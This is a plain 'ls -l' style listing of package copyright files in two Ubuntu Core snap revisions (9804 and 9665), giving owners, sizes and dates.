-rw-r--r-- 1 root root 1409 Apr  4  2019 /snap/core/9804/usr/share/doc/iproute2/copyright.gz
-rw-r--r-- 1 root root 5431 Jan 19  2016 /snap/core/9804/usr/share/doc/iptables/copyright.gz
-rw-r--r-- 1 root root 2233 Mar 15  2014 /snap/core/9804/usr/share/doc/iputils-ping/copyright.gz
-rw-r--r-- 1 root root 761 Dec  9  2016 /snap/core/9804/usr/share/doc/isc-dhcp-client/copyright.gz
-rw-r--r-- 1 root root 1459 Jan 14  2013 /snap/core/9804/usr/share/doc/iw/copyright.gz
-rw-r--r-- 1 root root 1363 Mar  4  2015 /snap/core/9804/usr/share/doc/kbd/copyright.gz
-rw-r--r-- 1 root root 1849 Apr 10  2019 /snap/core/9804/usr/share/doc/keyboard-configuration/copyright.gz
-rw-r--r-- 1 root root 1117 Jan 22  2008 /snap/core/9804/usr/share/doc/less/copyright.gz
-rw-r--r-- 1 root root 437 Aug 25  2009 /snap/core/9804/usr/share/doc/libacl1/copyright.gz
-rw-r--r-- 1 root root 1585 Oct  4  2016 /snap/core/9804/usr/share/doc/libapparmor-perl/copyright.gz
-rw-r--r-- 1 root root 1585 Oct  4  2016 /snap/core/9804/usr/share/doc/libapparmor1/copyright.gz
-rw-r--r-- 1 root root 605 May 13 13:17 /snap/core/9804/usr/share/doc/libapt-inst2.0/copyright.gz
-rw-r--r-- 1 root root 605 May 13 13:17 /snap/core/9804/usr/share/doc/libapt-pkg5.0/copyright.gz
-rw-r--r-- 1 root root 1081 Jan  4  2016 /snap/core/9804/usr/share/doc/libasprintf0v5/copyright.gz
-rw-r--r-- 1 root root 444 Aug 26  2009 /snap/core/9804/usr/share/doc/libattr1/copyright.gz
-rw-r--r-- 1 root root 510 Dec 26  2015 /snap/core/9804/usr/share/doc/libaudit-common/copyright.gz
-rw-r--r-- 1 root root 510 Dec 26  2015 /snap/core/9804/usr/share/doc/libaudit1/copyright.gz
-rw-r--r-- 1 root root 4746 Mar 12  2016 /snap/core/9804/usr/share/doc/libblkid1/copyright.gz
-rw-r--r-- 1 root root 4571 Jan 27  2016 /snap/core/9804/usr/share/doc/libbsd0/copyright.gz
-rw-r--r-- 1 root root 1297 Jul  4  2019 /snap/core/9804/usr/share/doc/libbz2-1.0/copyright.gz
-rw-r--r-- 1 root root 6142 Mar 17  2016 /snap/core/9804/usr/share/doc/libc-bin/copyright.gz
-rw-r--r-- 1 root root 6142 Mar 17  2016 /snap/core/9804/usr/share/doc/libc6/copyright.gz
-rw-r--r-- 1 root root 763 Mar 25  2015 /snap/core/9804/usr/share/doc/libcap-ng0/copyright.gz
-rw-r--r-- 1 root root 1677 Oct  2  2015 /snap/core/9804/usr/share/doc/libcap2/copyright.gz
-rw-r--r-- 1 root root 1677 Oct  2  2015 /snap/core/9804/usr/share/doc/libcap2-bin/copyright.gz
-rw-r--r-- 1 root root 909 Sep 14  2015 /snap/core/9804/usr/share/doc/libcgmanager0/copyright.gz
-rw-r--r-- 1 root root 653 Jan 14  2011 /snap/core/9804/usr/share/doc/libcomerr2/copyright.gz
-rw-r--r-- 1 root root 1024 Mar 28  2015 /snap/core/9804/usr/share/doc/libcryptsetup4/copyright.gz
-rw-r--r-- 1 root root 1798 Aug 25  2015 /snap/core/9804/usr/share/doc/libdb5.3/copyright.gz
-rw-r--r-- 1 root root 6833 Oct  7  2019 /snap/core/9804/usr/share/doc/libdbus-1-3/copyright.gz
-rw-r--r-- 1 root root 1059 Nov 26  2015 /snap/core/9804/usr/share/doc/libdebconfclient0/copyright.gz
-rw-r--r-- 1 root root 757 Oct 30  2015 /snap/core/9804/usr/share/doc/libdevmapper1.02.1/copyright.gz
-rw-r--r-- 1 root root 2133 Aug  5  2019 /snap/core/9804/usr/share/doc/libdns-export162/copyright.gz
-rw-r--r-- 1 root root 1097 Aug  6  2015 /snap/core/9804/usr/share/doc/libedit2/copyright.gz
-rw-r--r-- 1 root root 819 Feb 19  2016 /snap/core/9804/usr/share/doc/libefivar0/copyright.gz
-rw-r--r-- 1 root root 618 Mar 25  2015 /snap/core/9804/usr/share/doc/libestr0/copyright.gz
-rw-r--r-- 1 root root 910 Jul 24  2015 /snap/core/9804/usr/share/doc/libexpat1/copyright.gz
-rw-r--r-- 1 root root 4746 Mar 12  2016 /snap/core/9804/usr/share/doc/libfdisk1/copyright.gz
-rw-r--r-- 1 root root 1507 Jun 10  2011 /snap/core/9804/usr/share/doc/libffi6/copyright.gz
-rw-r--r-- 1 root root 5734 Sep  6  2019 /snap/core/9804/usr/share/doc/libfreetype6/copyright.gz
-rw-r--r-- 1 root root 737 Jul 30  2014 /snap/core/9804/usr/share/doc/libfuse2/copyright.gz
-rw-r--r-- 1 root root 645 Mar 20  2016 /snap/core/9804/usr/share/doc/libfwup0/copyright.gz
-rw-r--r-- 1 root root 6275 Feb  9  2016 /snap/core/9804/usr/share/doc/libgcrypt20/copyright.gz
-rw-r--r-- 1 root root 1135 Nov 16  2014 /snap/core/9804/usr/share/doc/libgdbm3/copyright.gz
-rw-r--r-- 1 root root 1170 Oct 14  2011 /snap/core/9804/usr/share/doc/libglib2.0-0/copyright.gz
-rw-r--r-- 1 root root 883 Jul  5  2015 /snap/core/9804/usr/share/doc/libgmp10/copyright.gz
-rw-r--r-- 1 root root 7431 Mar 14  2016 /snap/core/9804/usr/share/doc/libgnutls-openssl27/copyright.gz
-rw-r--r-- 1 root root 7431 Mar 14  2016 /snap/core/9804/usr/share/doc/libgnutls30/copyright.gz
-rw-r--r-- 1 root root 666 Feb 10  2016 /snap/core/9804/usr/share/doc/libgpg-error0/copyright.gz
-rw-r--r-- 1 root root 9622 Feb 23  2016 /snap/core/9804/usr/share/doc/libgssapi-krb5-2/copyright.gz
-rw-r--r-- 1 root root 3065 Sep 22  2015 /snap/core/9804/usr/share/doc/libidn11/copyright.gz
-rw-r--r-- 1 root root 2133 Aug  5  2019 /snap/core/9804/usr/share/doc/libisc-export160/copyright.gz
-rw-r--r-- 1 root root 969 Apr 23  2014 /snap/core/9804/usr/share/doc/libjson-c2/copyright.gz
-rw-r--r-- 1 root root 9622 Feb 23  2016 /snap/core/9804/usr/share/doc/libk5crypto3/copyright.gz
-rw-r--r-- 1 root root 740 Oct  7  2015 /snap/core/9804/usr/share/doc/libkeyutils1/copyright.gz
-rw-r--r-- 1 root root 1368 Jan  6  2016 /snap/core/9804/usr/share/doc/libklibc/copyright.gz
-rw-r--r-- 1 root root 340 Oct 23  2018 /snap/core/9804/usr/share/doc/libkmod2/copyright.gz
-rw-r--r-- 1 root root 9622 Feb 23  2016 /snap/core/9804/usr/share/doc/libkrb5-3/copyright.gz
-rw-r--r-- 1 root root 9622 Feb 23  2016 /snap/core/9804/usr/share/doc/libkrb5support0/copyright.gz
-rw-r--r-- 1 root root 554 Sep 28  2015 /snap/core/9804/usr/share/doc/liblocale-gettext-perl/copyright.gz
-rw-r--r-- 1 root root 501 Dec  7  2013 /snap/core/9804/usr/share/doc/liblockfile-bin/copyright.gz
-rw-r--r-- 1 root root 501 Dec  7  2013 /snap/core/9804/usr/share/doc/liblockfile1/copyright.gz
-rw-r--r-- 1 root root 1378 Feb 17  2016 /snap/core/9804/usr/share/doc/liblz4-1/copyright.gz
-rw-r--r-- 1 root root 4951 Feb 12  2014 /snap/core/9804/usr/share/doc/liblzma5/copyright.gz
-rw-r--r-- 1 root root 508 Dec 20  2014 /snap/core/9804/usr/share/doc/liblzo2-2/copyright.gz
-rw-r--r-- 1 root root 725 Aug  4  2014 /snap/core/9804/usr/share/doc/libmnl0/copyright.gz
-rw-r--r-- 1 root root 4746 Mar 12  2016 /snap/core/9804/usr/share/doc/libmount1/copyright.gz
-rw-r--r-- 1 root root 1433 Jan  8  2014 /snap/core/9804/usr/share/doc/libmpdec2/copyright.gz
-rw-r--r-- 1 root root 519 Jun 22  2015 /snap/core/9804/usr/share/doc/libmpfr4/copyright.gz
-rw-r--r-- 1 root root 625 Oct 14  2015 /snap/core/9804/usr/share/doc/libnetfilter-conntrack3/copyright.gz
-rw-r--r-- 1 root root 3785 Aug  3  2015 /snap/core/9804/usr/share/doc/libnettle6/copyright.gz
-rw-r--r-- 1 root root 543 Jul 25  2015 /snap/core/9804/usr/share/doc/libnewt0.52/copyright.gz
-rw-r--r-- 1 root root 383 May 18  2013 /snap/core/9804/usr/share/doc/libnfnetlink0/copyright.gz
-rw-r--r-- 1 root root 475 Jan  8  2016 /snap/core/9804/usr/share/doc/libnih1/copyright.gz
-rw-r--r-- 1 root root 1811 Jan 23  2016 /snap/core/9804/usr/share/doc/libnl-3-200/copyright.gz
-rw-r--r-- 1 root root 1811 Jan 23  2016 /snap/core/9804/usr/share/doc/libnl-genl-3-200/copyright.gz
-rw-r--r-- 1 root root 1811 Jan 23  2016 /snap/core/9804/usr/share/doc/libnl-route-3-200/copyright.gz
-rw-r--r-- 1 root root 787 May 15  2012 /snap/core/9804/usr/share/doc/libnss-extrausers/copyright.gz
-rw-r--r-- 1 root root 2697 Apr 20 14:14 /snap/core/9804/usr/share/doc/libnss-myhostname/copyright.gz
-rw-r--r-- 1 root root 3265 Dec 20  2015 /snap/core/9804/usr/share/doc/libp11-kit0/copyright.gz
-rw-r--r-- 1 root root 1624 Apr  9  2018 /snap/core/9804/usr/share/doc/libpam-modules/copyright.gz
-rw-r--r-- 1 root root 1624 Apr  9  2018 /snap/core/9804/usr/share/doc/libpam-modules-bin/copyright.gz
-rw-r--r-- 1 root root 1624 Apr  9  2018 /snap/core/9804/usr/share/doc/libpam-runtime/copyright.gz
-rw-r--r-- 1 root root 2697 Apr 20 14:14 /snap/core/9804/usr/share/doc/libpam-systemd/copyright.gz
-rw-r--r-- 1 root root 1624 Apr  9  2018 /snap/core/9804/usr/share/doc/libpam0g/copyright.gz
-rw-r--r-- 1 root root 7320 Feb 10  2016 /snap/core/9804/usr/share/doc/libparted2/copyright.gz
-rw-r--r-- 1 root root 2462 Jul  4  2015 /snap/core/9804/usr/share/doc/libpcap0.8/copyright.gz
-rw-r--r-- 1 root root 1395 Mar 22  2016 /snap/core/9804/usr/share/doc/libpcre3/copyright.gz
-rw-r--r-- 1 root root 1830 Nov 25  2011 /snap/core/9804/usr/share/doc/libpcsclite1/copyright.gz
-rw-r--r-- 1 root root 1864 Nov 18  2015 /snap/core/9804/usr/share/doc/libpng12-0/copyright.gz
-rw-r--r-- 1 root root 1399 May  2  2012 /snap/core/9804/usr/share/doc/libpopt0/copyright.gz
-rw-r--r-- 1 root root 1218 Feb 20  2020 /snap/core/9804/usr/share/doc/libprocps4/copyright.gz
-rw-r--r-- 1 root root 4930 Aug  3  2013 /snap/core/9804/usr/share/doc/libpython3-stdlib/copyright.gz
-rw-r--r-- 1 root root 13568 Jun 12  2016 /snap/core/9804/usr/share/doc/libpython3.5-minimal/copyright.gz
-rw-r--r-- 1 root root 949 Aug 29  2009 /snap/core/9804/usr/share/doc/libreadline6/copyright.gz
-rw-r--r-- 1 root root 788 Jun 29 12:57 /snap/core/9804/usr/share/doc/libseccomp2/copyright.gz
-rw-r--r-- 1 root root 1393 Nov 18  2015 /snap/core/9804/usr/share/doc/libselinux1/copyright.gz
-rw-r--r-- 1 root root 883 May 16  2014 /snap/core/9804/usr/share/doc/libsemanage-common/copyright.gz
-rw-r--r-- 1 root root 883 May 16  2014 /snap/core/9804/usr/share/doc/libsemanage1/copyright.gz
-rw-r--r-- 1 root root 1013 Nov 18  2015 /snap/core/9804/usr/share/doc/libsepol1/copyright.gz
-rw-r--r-- 1 root root 291 Jun  4  2014 /snap/core/9804/usr/share/doc/libsigsegv2/copyright.gz
-rw-r--r-- 1 root root 820 Jun 28  2018 /snap/core/9804/usr/share/doc/libslang2/copyright.gz
-rw-r--r-- 1 root root 4746 Mar 12  2016 /snap/core/9804/usr/share/doc/libsmartcols1/copyright.gz
-rw-r--r-- 1 root root 735 Dec  8  2013 /snap/core/9804/usr/share/doc/libsqlite3-0/copyright.gz
-rw-r--r-- 1 root root 662 Jan 14  2011 /snap/core/9804/usr/share/doc/libss2/copyright.gz
-rw-r--r-- 1 root root 2243 Oct 12  2005 /snap/core/9804/usr/share/doc/libssl1.0.0/copyright.gz
-rw-r--r-- 1 root root 2697 Apr 20 14:14 /snap/core/9804/usr/share/doc/libsystemd0/copyright.gz
-rw-r--r-- 1 root root 1291 Apr 27  2015 /snap/core/9804/usr/share/doc/libtasn1-6/copyright.gz
-rw-r--r-- 1 root root 2124 Feb 14  2016 /snap/core/9804/usr/share/doc/libtinfo5/copyright.gz
-rw-r--r-- 1 root root 2697 Apr 20 14:14 /snap/core/9804/usr/share/doc/libudev1/copyright.gz
-rw-r--r-- 1 root root 1443 Jan  8  2016 /snap/core/9804/usr/share/doc/libusb-0.1-4/copyright.gz
-rw-r--r-- 1 root root 2035 May  3  2015 /snap/core/9804/usr/share/doc/libustr-1.0-1/copyright.gz
-rw-r--r-- 1 root root 4746 Mar 12  2016 /snap/core/9804/usr/share/doc/libuuid1/copyright.gz
-rw-r--r-- 1 root root 669 Apr  6  2008 /snap/core/9804/usr/share/doc/libwrap0/copyright.gz
-rw-r--r-- 1 root root 5431 Jan 19  2016 /snap/core/9804/usr/share/doc/libxtables11/copyright.gz
-rw-r--r-- 1 root root 923 Aug 19  2014 /snap/core/9804/usr/share/doc/libyaml-0-2/copyright.gz
-rw-r--r-- 1 root root 759 Mar 18  2020 /snap/core/9804/usr/share/doc/linux-base/copyright.gz
-rw-r--r-- 1 root root 174 Apr 29  2001 /snap/core/9804/usr/share/doc/lockfile-progs/copyright.gz
-rw-r--r-- 1 root root 2461 Nov 12  2015 /snap/core/9804/usr/share/doc/login/copyright.gz
-rw-r--r-- 1 root root 881 Mar 22  2017 /snap/core/9804/usr/share/doc/logrotate/copyright.gz
-rw-r--r-- 1 root root 1334 May 27  2014 /snap/core/9804/usr/share/doc/lsb-base/copyright.gz
-rw-r--r-- 1 root root 1334 May 27  2014 /snap/core/9804/usr/share/doc/lsb-release/copyright.gz
-rw-r--r-- 1 root root 1188 Mar 27  2017 /snap/core/9804/usr/share/doc/makedev/copyright.gz
-rw-r--r-- 1 root root 753 Mar 24  2014 /snap/core/9804/usr/share/doc/mawk/copyright.gz
-rw-r--r-- 1 root root 720 Oct 30  2015 /snap/core/9804/usr/share/doc/mime-support/copyright.gz
-rw-r--r-- 1 root root 4746 Mar 12  2016 /snap/core/9804/usr/share/doc/mount/copyright.gz
-rw-r--r-- 1 root root 6142 Mar 17  2016 /snap/core/9804/usr/share/doc/multiarch-support/copyright.gz
-rw-r--r-- 1 root root 2124 Feb 14  2016 /snap/core/9804/usr/share/doc/ncurses-base/copyright.gz
-rw-r--r-- 1 root root 2124 Feb 14  2016 /snap/core/9804/usr/share/doc/ncurses-bin/copyright.gz
-rw-r--r-- 1 root root 734 Jun 30  2014 /snap/core/9804/usr/share/doc/net-tools/copyright.gz
-rw-r--r-- 1 root root 369 Apr  1  2013 /snap/core/9804/usr/share/doc/netbase/copyright.gz
-rw-r--r-- 1 root root 1050 Jun 13  2012 /snap/core/9804/usr/share/doc/netcat-openbsd/copyright.gz
-rw-r--r-- 1 root root 234 Jun 29  2018 /snap/core/9804/usr/share/doc/nplan/copyright.gz
-rw-r--r-- 1 root root 6051 May 26 23:12 /snap/core/9804/usr/share/doc/openssh-client/copyright.gz
-rw-r--r-- 1 root root 7320 Feb 10  2016 /snap/core/9804/usr/share/doc/parted/copyright.gz
-rw-r--r-- 1 root root 2461 Nov 12  2015 /snap/core/9804/usr/share/doc/passwd/copyright.gz
-rw-r--r-- 1 root root 22706 Mar 13  2016 /snap/core/9804/usr/share/doc/perl/copyright.gz
-rw-r--r-- 1 root root 3684 Jan 27  2016 /snap/core/9804/usr/share/doc/ppp/copyright.gz
-rw-r--r-- 1 root root 538 Nov  4  2016 /snap/core/9804/usr/share/doc/probert/copyright.gz
-rw-r--r-- 1 root root 1218 Feb 20  2020 /snap/core/9804/usr/share/doc/procps/copyright.gz
-rw-r--r-- 1 root root 4930 Aug  3  2013 /snap/core/9804/usr/share/doc/python3/copyright.gz
-rw-r--r-- 1 root root 1563 Aug  2  2014 /snap/core/9804/usr/share/doc/python3-blinker/copyright.gz
-rw-r--r-- 1 root root 908 Feb 18  2016 /snap/core/9804/usr/share/doc/python3-cffi-backend/copyright.gz
-rw-r--r-- 1 root root 579 Feb 10  2016 /snap/core/9804/usr/share/doc/python3-chardet/copyright.gz
-rw-r--r-- 1 root root 1116 Aug 28  2014 /snap/core/9804/usr/share/doc/python3-configobj/copyright.gz
-rw-r--r-- 1 root root 1122 Mar  5  2016 /snap/core/9804/usr/share/doc/python3-cryptography/copyright.gz
-rw-r--r-- 1 root root 2636 Jun  8  2015 /snap/core/9804/usr/share/doc/python3-idna/copyright.gz
-rw-r--r-- 1 root root 1532 Jul 25  2011 /snap/core/9804/usr/share/doc/python3-jinja2/copyright.gz
-rw-r--r-- 1 root root 947 Oct 23  2015 /snap/core/9804/usr/share/doc/python3-json-pointer/copyright.gz
-rw-r--r-- 1 root root 947 Oct 23  2015 /snap/core/9804/usr/share/doc/python3-jsonpatch/copyright.gz
-rw-r--r-- 1 root root 829 Jul 10  2015 /snap/core/9804/usr/share/doc/python3-jwt/copyright.gz
-rw-r--r-- 1 root root 1585 Oct  4  2016 /snap/core/9804/usr/share/doc/python3-libapparmor/copyright.gz
-rw-r--r-- 1 root root 1024 Aug 21  2010 /snap/core/9804/usr/share/doc/python3-markupsafe/copyright.gz
-rw-r--r-- 1 root root 4930 Aug  3  2013 /snap/core/9804/usr/share/doc/python3-minimal/copyright.gz
-rw-r--r-- 1 root root 995 Sep  7  2014 /snap/core/9804/usr/share/doc/python3-oauthlib/copyright.gz
-rw-r--r-- 1 root root 4955 May  8  2013 /snap/core/9804/usr/share/doc/python3-pkg-resources/copyright.gz
-rw-r--r-- 1 root root 1342 Sep 30  2013 /snap/core/9804/usr/share/doc/python3-pyasn1/copyright.gz
-rw-r--r-- 1 root root 5759 Feb 11  2011 /snap/core/9804/usr/share/doc/python3-pyudev/copyright.gz
-rw-r--r-- 1 root root 7550 Feb 12  2016 /snap/core/9804/usr/share/doc/python3-requests/copyright.gz
-rw-r--r-- 1 root root 1484 Jan 26  2016 /snap/core/9804/usr/share/doc/python3-serial/copyright.gz
-rw-r--r-- 1 root root 805 Feb  9  2016 /snap/core/9804/usr/share/doc/python3-six/copyright.gz
-rw-r--r-- 1 root root 1954 Feb 12  2016 /snap/core/9804/usr/share/doc/python3-urllib3/copyright.gz
-rw-r--r-- 1 root root 723 Nov  3  2015 /snap/core/9804/usr/share/doc/python3-urwid/copyright.gz
-rw-r--r-- 1 root root 900 Dec  2  2015 /snap/core/9804/usr/share/doc/python3-yaml/copyright.gz
-rw-r--r-- 1 root root 13568 Jun 12  2016 /snap/core/9804/usr/share/doc/python3.5/copyright.gz
-rw-r--r-- 1 root root 13568 Jun 12  2016 /snap/core/9804/usr/share/doc/python3.5-minimal/copyright.gz
-rw-r--r-- 1 root root 949 Aug 29  2009 /snap/core/9804/usr/share/doc/readline-common/copyright.gz
-rw-r--r-- 1 root root 140 Feb 16  2016 /snap/core/9804/usr/share/doc/realpath/copyright.gz
-rw-r--r-- 1 root root 569 Nov 29  2017 /snap/core/9804/usr/share/doc/resolvconf/copyright.gz
-rw-r--r-- 1 root root 957 Sep 26  2013 /snap/core/9804/usr/share/doc/rfkill/copyright.gz
-rw-r--r-- 1 root root 1793 Jan 27  2016 /snap/core/9804/usr/share/doc/rsyslog/copyright.gz
-rw-r--r-- 1 root root 788 Jun 29 12:57 /snap/core/9804/usr/share/doc/seccomp/copyright.gz
-rw-r--r-- 1 root root 448 Feb 11  2016 /snap/core/9804/usr/share/doc/sed/copyright.gz
-rw-r--r-- 1 root root 390 Nov 26  2010 /snap/core/9804/usr/share/doc/sensible-utils/copyright.gz
-rw-r--r-- 1 root root 601 Jul 28 19:43 /snap/core/9804/usr/share/doc/snapd/copyright.gz
-rw-r--r-- 1 root root 684 Sep 18  2013 /snap/core/9804/usr/share/doc/squashfs-tools/copyright.gz
-rw-r--r-- 1 root root 546 Aug 23  2016 /snap/core/9804/usr/share/doc/subiquitycore/copyright.gz
-rw-r--r-- 1 root root 1484 Dec 23  2015 /snap/core/9804/usr/share/doc/sudo/copyright.gz
-rw-r--r-- 1 root root 2697 Apr 20 14:14 /snap/core/9804/usr/share/doc/systemd/copyright.gz
-rw-r--r-- 1 root root 2697 Apr 20 14:14 /snap/core/9804/usr/share/doc/systemd-sysv/copyright.gz
-rw-r--r-- 1 root root 841 Jan 19  2016 /snap/core/9804/usr/share/doc/sysv-rc/copyright.gz
-rw-r--r-- 1 root root 1146 Jan 19  2016 /snap/core/9804/usr/share/doc/sysvinit-utils/copyright.gz
-rw-r--r-- 1 root root 634 Sep 28  2015 /snap/core/9804/usr/share/doc/tar/copyright.gz
-rw-r--r-- 1 root root 246 Jan 21  2016 /snap/core/9804/usr/share/doc/tzdata/copyright.gz
-rw-r--r-- 1 root root 5211 Nov  9  2016 /snap/core/9804/usr/share/doc/u-boot-tools/copyright.gz
-rw-r--r-- 1 root root 433 Jul 10  2015 /snap/core/9804/usr/share/doc/ubuntu-core/copyright.gz
-rw-r--r-- 1 root root 552 May 10  2017 /snap/core/9804/usr/share/doc/ubuntu-core-config/copyright.gz
-rw-r--r-- 1 root root 433 Oct 28  2014 /snap/core/9804/usr/share/doc/ubuntu-core-libs/copyright.gz
-rw-r--r-- 1 root root 621 Oct  5  2015 /snap/core/9804/usr/share/doc/ubuntu-core-security-apparmor/copyright.gz
-rw-r--r-- 1 root root 621 Oct  5  2015 /snap/core/9804/usr/share/doc/ubuntu-core-security-seccomp/copyright.gz
-rw-r--r-- 1 root root 621 Oct  5  2015 /snap/core/9804/usr/share/doc/ubuntu-core-security-utils/copyright.gz
-rw-r--r-- 1 root root 601 Jul 28 19:43 /snap/core/9804/usr/share/doc/ubuntu-core-snapd-units/copyright.gz
-rw-r--r-- 1 root root 570 Oct 28  2016 /snap/core/9804/usr/share/doc/ubuntu-fan/copyright.gz
-rw-r--r-- 1 root root 684 Jun  3 16:41 /snap/core/9804/usr/share/doc/ubuntu-keyring/copyright.gz
-rw-r--r-- 1 root root 706 Mar 16  2016 /snap/core/9804/usr/share/doc/ucf/copyright.gz
-rw-r--r-- 1 root root 2697 Apr 20 14:14 /snap/core/9804/usr/share/doc/udev/copyright.gz
-rw-r--r-- 1 root root 4746 Mar 12  2016 /snap/core/9804/usr/share/doc/util-linux/copyright.gz
-rw-r--r-- 1 root root 4124 Apr  3  2016 /snap/core/9804/usr/share/doc/vim-common/copyright.gz
-rw-r--r-- 1 root root 543 Jul 25  2015 /snap/core/9804/usr/share/doc/whiptail/copyright.gz
-rw-r--r-- 1 root root 821 Jan  2  2015 /snap/core/9804/usr/share/doc/wireless-regdb/copyright.gz
-rw-r--r-- 1 root root 4096 Jul 17  2015 /snap/core/9804/usr/share/doc/wpasupplicant/copyright.gz
-rw-r--r-- 1 root root 569 May 29  2011 /snap/core/9804/usr/share/doc/xdelta3/copyright.gz
-rw-r--r-- 1 root root 2357 Jan 22  2016 /snap/core/9804/usr/share/doc/xkb-data/copyright.gz
-rw-r--r-- 1 root root 4951 Feb 12  2014 /snap/core/9804/usr/share/doc/xz-utils/copyright.gz
-rw-r--r-- 1 root root 867 Dec 18  2019 /snap/core/9804/usr/share/doc/zlib1g/copyright.gz
-rw-r--r-- 1 root root 853 Jul 28  2011 /snap/core/9665/usr/share/doc/abootimg/copyright.gz
-rw-r--r-- 1 root root 437 Aug 25  2009 /snap/core/9665/usr/share/doc/acl/copyright.gz
-rw-r--r-- 1 root root 1004 Jul  2  2015 /snap/core/9665/usr/share/doc/adduser/copyright.gz
-rw-r--r-- 1 root root 1585 Oct  4  2016 /snap/core/9665/usr/share/doc/apparmor/copyright.gz
-rw-r--r-- 1 root root 605 May 13 13:17 /snap/core/9665/usr/share/doc/apt/copyright.gz
-rw-r--r-- 1 root root 669 Sep 30  2019 /snap/core/9665/usr/share/doc/base-files/copyright.gz
-rw-r--r-- 1 root root 463 Nov 21  2015 /snap/core/9665/usr/share/doc/base-passwd/copyright.gz
-rw-r--r-- 1 root root 3077 Mar  3  2014 /snap/core/9665/usr/share/doc/bash/copyright.gz
-rw-r--r-- 1 root root 507 Aug 12  2015 /snap/core/9665/usr/share/doc/bash-completion/copyright.gz
-rw-r--r-- 1 root root 369 Aug 20  2015 /snap/core/9665/usr/share/doc/bridge-utils/copyright.gz
-rw-r--r-- 1 root root 4746 Mar 12  2016 /snap/core/9665/usr/share/doc/bsdutils/copyright.gz
-rw-r--r-- 1 root root 667 Aug  7  2015 /snap/core/9665/usr/share/doc/busybox-initramfs/copyright.gz
-rw-r--r-- 1 root root 1297 Jul  4  2019 /snap/core/9665/usr/share/doc/bzip2/copyright.gz
-rw-r--r-- 1 root root 6202 Dec 20  2015 /snap/core/9665/usr/share/doc/ca-certificates/copyright.gz
-rw-r--r-- 1 root root 164 Dec 20  2015 /snap/core/9665/usr/share/doc/ca-certificates/examples/ca-certificates-local/debian/copyright.gz
-rw-r--r-- 1 root root 909 Sep 14  2015 /snap/core/9665/usr/share/doc/cgmanager/copyright.gz
-rw-r--r-- 1 root root 599 Apr 19  2018 /snap/core/9665/usr/share/doc/cloud-guest-utils/copyright.gz
-rw-r--r-- 1 root root 863 Jan 15  2020 /snap/core/9665/usr/share/doc/cloud-init/copyright.gz
-rw-r--r-- 1 root root 546 Aug 23  2016 /snap/core/9665/usr/share/doc/console-conf/copyright.gz
-rw-r--r-- 1 root root 2440 Feb 16  2016 /snap/core/9665/usr/share/doc/coreutils/copyright.gz
-rw-r--r-- 1 root root 414 Nov  5  2019 /snap/core/9665/usr/share/doc/cpio/copyright.gz
-rw-r--r-- 1 root root 4864 Aug 23  2014 /snap/core/9665/usr/share/doc/crda/copyright.gz
-rw-r--r-- 1 root root 1749 Apr  5  2016 /snap/core/9665/usr/share/doc/cron/copyright.gz
-rw-r--r-- 1 root root 1586 Feb 17  2016 /snap/core/9665/usr/share/doc/dash/copyright.gz
-rw-r--r-- 1 root root 6833 Oct  7  2019 /snap/core/9665/usr/share/doc/dbus/copyright.gz
-rw-r--r-- 1 root root 1117 Nov  8  2015 /snap/core/9665/usr/share/doc/debconf/copyright.gz
-rw-r--r-- 1 root root 3496 May  6  2009 /snap/core/9665/usr/share/doc/debianutils/copyright.gz
-rw-r--r-- 1 root root 740 Jul 14  2013 /snap/core/9665/usr/share/doc/dh-python/copyright.gz
-rw-r--r-- 1 root root 869 Dec 26  2015 /snap/core/9665/usr/share/doc/diffutils/copyright.gz
-rw-r--r-- 1 root root 602 May  4  2015 /snap/core/9665/usr/share/doc/distro-info-data/copyright.gz
-rw-r--r-- 1 root root 552 Jul 12  2018 /snap/core/9665/usr/share/doc/dnsmasq-base/copyright.gz
-rw-r--r-- 1 root root 778 Aug 14  2015 /snap/core/9665/usr/share/doc/dosfstools/copyright.gz
-rw-r--r-- 1 root root 3021 Jul 16  2019 /snap/core/9665/usr/share/doc/dpkg/copyright.gz
-rw-r--r-- 1 root root 1701 Jun 25  2014 /snap/core/9665/usr/share/doc/e2fslibs/copyright.gz
-rw-r--r-- 1 root root 1701 Jun 25  2014 /snap/core/9665/usr/share/doc/e2fsprogs/copyright.gz
-rw-r--r-- 1 root root 788 Jul 13  2015 /snap/core/9665/usr/share/doc/efibootmgr/copyright.gz
-rw-r--r-- 1 root root 1422 Jan 16  2016 /snap/core/9665/usr/share/doc/findutils/copyright.gz
-rw-r--r-- 1 root root 645 Mar 20  2016 /snap/core/9665/usr/share/doc/fwupdate/copyright.gz
-rw-r--r-- 1 root root 448 Oct 31  2015 /snap/core/9665/usr/share/doc/fwupdate-signed/copyright.gz
-rw-r--r-- 1 root root 716 Apr  8  2014 /snap/core/9665/usr/share/doc/gawk/copyright.gz
-rw-r--r-- 1 root root 8609 Oct  4  2019 /snap/core/9665/usr/share/doc/gcc-5-base/copyright.gz
-rw-r--r-- 1 root root 8610 Apr 15  2016 /snap/core/9665/usr/share/doc/gcc-6-base/copyright.gz
-rw-r--r-- 1 root root 4837 Nov  9  2014 /snap/core/9665/usr/share/doc/gdbserver/copyright.gz
-rw-r--r-- 1 root root 702 May 10  2015 /snap/core/9665/usr/share/doc/gdisk/copyright.gz
-rw-r--r-- 1 root root 1081 Jan  4  2016 /snap/core/9665/usr/share/doc/gettext-base/copyright.gz
-rw-r--r-- 1 root root 1651 Dec 22  2015 /snap/core/9665/usr/share/doc/gnupg/copyright.gz
-rw-r--r-- 1 root root 1651 Dec 22  2015 /snap/core/9665/usr/share/doc/gpgv/copyright.gz
-rw-r--r-- 1 root root 991 Mar  4  2016 /snap/core/9665/usr/share/doc/grep/copyright.gz
-rw-r--r-- 1 root root 660 Dec 25  2013 /snap/core/9665/usr/share/doc/gzip/copyright.gz
-rw-r--r-- 1 root root 636 Sep  1  2015 /snap/core/9665/usr/share/doc/hostname/copyright.gz
-rw-r--r-- 1 root root 672 Nov 30  2016 /snap/core/9665/usr/share/doc/ifupdown/copyright.gz
-rw-r--r-- 1 root root 1064 Feb 29  2016 /snap/core/9665/usr/share/doc/init/copyright.gz
-rw-r--r-- 1 root root 1064 Feb 29  2016 /snap/core/9665/usr/share/doc/init-system-helpers/copyright.gz
-rw-r--r-- 1 root root 541 Oct  7  2019 /snap/core/9665/usr/share/doc/initramfs-tools/copyright.gz
-rw-r--r-- 1 root root 541 Oct  7  2019 /snap/core/9665/usr/share/doc/initramfs-tools-bin/copyright.gz
-rw-r--r-- 1 root root 541 Oct  7  2019 /snap/core/9665/usr/share/doc/initramfs-tools-core/copyright.gz
